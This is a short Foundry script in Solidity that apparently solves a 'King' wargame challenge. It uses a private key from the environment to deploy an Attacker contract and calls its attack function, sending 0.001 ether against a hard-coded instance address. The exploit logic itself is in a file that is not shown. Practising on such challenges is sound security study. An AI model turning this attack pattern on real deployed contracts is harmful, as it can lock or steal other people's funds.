// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/King.sol";
import "../src/Attacker.sol";

contract KingScript is Script {
    
    address instance = 0xE01d613e4511E78979C41D8a0c3Ca83F056E050E;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker();
        attacker.attack{value: 0.001 ether}();
        vm.stopBroadcast();
    }
}
